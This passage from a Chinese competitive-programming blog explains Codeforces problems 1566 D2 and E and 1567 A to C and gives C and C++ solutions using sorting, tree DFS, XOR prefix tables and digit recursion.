href="https://codeforces.com/contest/1566/problem/D2">原题链接</a></p><blockquote><p>有$n$行$m$列的座位和$n \times m$个人, 视力不好的人的座位编号应该比视力好的小. 这些人按照原顺序进场, 走到他们座位所在行再从左到右走找到自己座位. 如果走到自己座位之前要经过另一个人, 不满意度加1. 求最小不满意度.</p></blockquote><script type="math/tex; mode=display">\begin{array}{|c|c|c|}\hline1 & 2 & \dots & m-1 & m \\\hlinem+1 & m+2 & \dots & 2m-1 & 2m \\\hline2m+1 & 2m+2 & \dots & 3m-1 & 3m \\\hline\vdots & \vdots & \ddots & \vdots & \vdots \\\hlinem(n-1)+1 & m(n-1)+2 & \dots & nm-1 & nm \\\hline\end{array}</script><p>对于视力不同的一堆人, 他们的所有位置是确定的, 我们要调整的是视力相同的人的位置.<br>所以先排序, 以视力为第一顺序, 序号为第二顺序.<br><div class="note info flat"><p><code>qsort</code>是C库函数, 用C习惯了就没使用C++的<code>sort</code>和重载运算符了. (也不知道这二者效率的分别, 等哪天找个机会测试一下)</p></div><br>考虑相同视力的人的内部排序. 在同一行座位中, 我们应该把序号小的放在右边, 这样同视力但序号大的人就不会增加不满意度.<br>对于在不同行但同视力的人, 只有靠后的行影响其他人的不满意度, 而在之前的排序中, 已经尽可能把序号大的向后放置了, 所以只要反转同一行就行.<br>程序思路大概是排完序后遍历每一行, 对于同视力的连续座位, 把序号<code>reverse</code>一下就好了.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">info</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> i, a;</span><br><span class="line">&#125;info, *pinfo;</span><br><span class="line"></span><br><span class="line">info b[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p1, <span class="keyword">const</span> <span class="keyword">void</span> *p2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pinfo a = (<span class="keyword">const</span> pinfo)p1, b = (<span class="keyword">const</span> pinfo)p2;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;a != b-&gt;a) <span class="keyword">return</span> a-&gt;a &lt; b-&gt;a ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> a-&gt;i &lt; b-&gt;i ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (q - p &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    info tmp; <span class="keyword">int</span> i, r;</span><br><span class="line">    <span class="keyword">for</span> (i = p; i &lt; (p + q) / <span class="number">2</span>; i++)&#123;</span><br><span class="line">        r = p + q - i - <span class="number">1</span>;</span><br><span class="line">        tmp = b[i];</span><br><span class="line">        b[i] = b[r];</span><br><span class="line">        b[r] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">adjust</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r, t = <span class="number">0</span>, pos, i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++, t++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span>)&#123;r = b[t].a; pos = t; <span class="keyword">continue</span>;&#125;</span><br><span class="line">            <span class="keyword">if</span> (b[t].a != r)&#123;</span><br><span class="line">                r = b[t].a;</span><br><span class="line">                <span class="built_in">reverse</span>(pos, t);</span><br><span class="line">                pos = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(pos, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, i, j, k, t;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = m - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">            t = b[i * m + j].i;</span><br><span class="line">            <span class="keyword">for</span> (k = j - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--)&#123;</span><br><span class="line">                <span class="keyword">if</span> (b[i * m + k].i &lt; t) sum++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T; <span class="keyword">int</span> n, m, i, t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">        t = n * m;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; t; i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i].a);</span><br><span class="line">            b[i].i = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">qsort</span>(b, t, <span class="built_in"><span class="keyword">sizeof</span></span> (info), cmp);</span><br><span class="line">        <span class="built_in">adjust</span>(n, m);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">calc</span>(n, m));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><psw>比赛的时候没注意看题, 原题D1和D2是一样的, D1的$n$固定是1, 要是D2当时做不出来就难受了. 不过最后D2通过了, 妙~~啊~~.</psw><h2 id="E-Buds-Re-hanging"><a href="#E-Buds-Re-hanging" class="headerlink" title="E. Buds Re-hanging"></a>E. Buds Re-hanging</h2><p><a href="https://codeforces.com/contest/1566/problem/E">原题链接</a></p><blockquote><p>把树中子节点全为叶子的结点叫做bud. 给定一棵有根树, 可以把bud和它的子节点整个移动到树中其他结点, 求经过有限次移动后的新树中最小叶子数.</p></blockquote><p>可以先不考虑一个bud取下来以后挂在哪个节点上, 直接把它放在一边, 等最后把所有的子树拼起来就OK, 如图.<br><img src="/pictures/cfg16_e_1.svg" alt="E题图解"><br>结果: $(2-1)+(1-1)+(1-1)+1=2$<br>用dfs遍历子树, 每次遇到拆解后可以形成的bud节点, 统计这棵树的叶子数. 因为最后拼接的时候其中一个叶子要和下一个bud连接, 所以实际统计的是叶子数-1. 最后一个bud没有下一个和它连接了, 就不用-1, 到最后的时候答案+1就好.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Referred to the code on https://codeforces.com/contest/1566/submission/128689795</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; tree[<span class="number">200001</span>];</span><br><span class="line"><span class="keyword">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> node, <span class="keyword">int</span> pre)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>, i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tree[node].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> next = tree[node][i];</span><br><span class="line">        <span class="keyword">if</span> (next != pre) n += <span class="built_in">dfs</span>(next, node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ans += n - <span class="number">1</span>; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, a, b, i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) tree[i].<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">            tree[a].<span class="built_in">push_back</span>(b), tree[b].<span class="built_in">push_back</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line">        ans = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>后面的先搁着吧, 等星期八再补</del></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm </tag>
            
            <tag> cf </tag>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces #742 部分题解记录</title>
      <link href="/2021/09/10/Codeforces742/"/>
      <url>/2021/09/10/Codeforces742/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><del><mark class="hl-label default">语无伦次系列</mark> </del></p><h2 id="A-Domino-Disaster"><a href="#A-Domino-Disaster" class="headerlink" title="A. Domino Disaster"></a>A. Domino Disaster</h2><p><a href="https://codeforces.com/contest/1567/problem/A">原题链接</a></p><blockquote><p>给定一个 $2 \times n$ 的网格, 向其中填入多米诺骨牌, 给出其中一行, 求另一行</p></blockquote><p>直接根据另一行输出即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %s&quot;</span>, &amp;n, buf);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(buf[i])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;U&#x27;</span>: <span class="built_in">putchar</span>(<span class="string">&#x27;D&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>: <span class="built_in">putchar</span>(<span class="string">&#x27;U&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>: <span class="built_in">putchar</span>(<span class="string">&#x27;L&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>: <span class="built_in">putchar</span>(<span class="string">&#x27;R&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-MEXor-Mixup"><a href="#B-MEXor-Mixup" class="headerlink" title="B. MEXor Mixup"></a>B. MEXor Mixup</h2><p><a href="https://codeforces.com/contest/1567/problem/A">原题链接</a></p><blockquote><p>求一个满足以下条件最短序列的大小:<br>① 不在序列中的最小非负数为 $a$<br>② 序列中所有数异或的结果为 $b$</p></blockquote><div class="note blue flat"><p><strong>众所周知, 异或的两个性质:</strong></p><ul><li><p>$a \oplus b \oplus b = a$</p></li><li><p>若$a \oplus b =  c$, 则 $a = b\oplus c$</p></li></ul></div><p>由①, $0 \sim a-1$ 的数在序列中必须存在, 先把它们与 $b$ 异或, 就可以得到序列中其他元素的异或值$v$</p><p>异或的结果有三种情况:</p><ul><li><p>$v=0$</p><p>不用再加元素了, $0 \sim a-1$ 就可以让它们的异或为$b$.</p></li><li><p>$v=a$</p><p>最坏的情况, 只加一个元素的话只能加$a$, 但是加了$a$就不满足条件①了. 所以尝试加两个元素.</p><p>设$x=$<code>0xFFFF0000</code>, 可以加上$x$和$v \oplus x$, 这样两个元素均不是$a$而且异或的值等于$a$.</p></li><li><p>其他</p><p>简单加上$v$即可.</p></li></ul><p>可以先将$0 \sim 300000$内异或运算的值缓存到变量<code>tab</code>中.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> tab[<span class="number">300001</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> prev = <span class="number">0</span>, i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">300000</span>; i++)&#123;</span><br><span class="line">        prev = tab[i] = prev ^ i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> T, m, n;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%u %u&quot;</span>, &amp;m, &amp;n);</span><br><span class="line">        <span class="keyword">unsigned</span> v = tab[m - <span class="number">1</span>] ^ n, r;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0</span>) r = m;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (v == m) r = m + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> r = m + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Carrying-Conundrum"><a href="#C-Carrying-Conundrum" class="headerlink" title="C. Carrying Conundrum"></a>C. Carrying Conundrum</h2><p><a href="https://codeforces.com/contest/1567/problem/C">原题链接</a></p><blockquote><p>Alice 进行加法计算时, 进位没有算到下一位, 而是下两位, 像这样<br><img src="https://espresso.codeforces.com/6cb0cb293dab7ce533fb10c4da8e27610d5181b9.png" alt="正确的加法"> <img src="https://espresso.codeforces.com/98f8d3960e701645917956668cbe390f5a807d04.png" alt="Alice的加法"><br>现给出$n$, 求有序正整数对的数量, 使得数对中的两个数按照 Alice 的方法可以得出结果$n$.</p></blockquote><div class="tabs" id="方法"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#方法-1">方法 1</button></li><li class="tab"><button type="button" data-href="#方法-2">方法 2</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="方法-1"><p>我的想法是, 枚举能出现的数字, 然后递归枚举所有情况<br>比如已知$n=12345$, 假设$M=\overline{abcde}$, $N=\overline{vwxyz}$.<br>现在知道最后一位数字是5, 那么$(e,z)$可以是$(0,5),(1,4),(2,3),(3,2),(4,1),(5,0),(6,9),(7,8),(8,7),(9,6)$. <u>后面四种是需要进位的情况, 在代码中用<code>adv</code>保存进位</u><br>根据进位与否把这些有序对分为两类, 递归求解在进位与不进位的情况下各有多少种情况(对应代码18~21行), 再把它们相乘相加.<br><u>递归终止条件为数的第一位已算出, 但是还有进位标记</u><br>真正的结果还要减二, 因为0不是正整数, 而我们枚举出的结果是包含$(0,n)$和$(n,0)$的.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> num[<span class="number">11</span>], adv[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    N = <span class="built_in">strlen</span>(p);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) num[i] = p[N - i - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">proc</span><span class="params">(<span class="keyword">int</span> d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j; <span class="keyword">unsigned</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (d &gt;= N) <span class="keyword">return</span> (adv[d] == <span class="number">1</span> || adv[d + <span class="number">1</span>] == <span class="number">1</span>) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">    i = num[d] - adv[d];</span><br><span class="line">    adv[d + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    total += <span class="built_in">proc</span>(d + <span class="number">1</span>) * (<span class="number">9</span> - i);</span><br><span class="line">    adv[d + <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    total += <span class="built_in">proc</span>(d + <span class="number">1</span>) * (i + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(adv, <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">proc</span>(<span class="number">0</span>) - <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> T; <span class="keyword">char</span> p[<span class="number">11</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br><span class="line">        <span class="built_in">arr</span>(p);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>, <span class="built_in">calc</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="方法-2"><blockquote><p>打cf的时候, 我用的第一种方法, 当时递归出bug了, 调试用了很长时间, 因为递归的bug是真的难找.<br>下面是来自<a href="http://wyh-de-house.top/">@wyh</a>的方法:</p></blockquote><p>因为每次进位都加到下两位, 所以每一位对于相邻的位没有任何影响, 把$n$按奇偶分成两个独立的数, 对于这两个数, 加法时的进位可以看成是正常的, 两数相乘再减二就是结果.<br><img src="/pictures/cf742_d_1.png" alt="过程图解"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        string s;</span><br><span class="line">        cin &gt;&gt; s;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); ++ i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;<span class="number">1</span>)&#123;</span><br><span class="line">                a = a*<span class="number">10</span> + s[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                b = b*<span class="number">10</span> + s[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, (a+<span class="number">1</span>)*(b+<span class="number">1</span>)<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后突然感觉我的方法好复杂, 当时时间全花在这个题了. 然后, 就没有然后了<br><del>所以, 人生苦短, 别用递归(误)</del></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="D-Expression-Evaluation-Error"><a href="#D-Expression-Evaluation-Error" class="headerlink" title="D. Expression Evaluation Error"></a>D. Expression Evaluation Error</h2><p><a href="https://codeforces.com/contest/1567/problem/D">原题链接</a></p><blockquote><p>给出整数$s$和$n$, 把$s$拆分成$n$个正整数, 求一种拆分方式, 使这$n$个数被当做11进制相加时, 得到的数最大.</p></blockquote><p>结论: 当有最大为$t$的数可以分配给某个元素时, 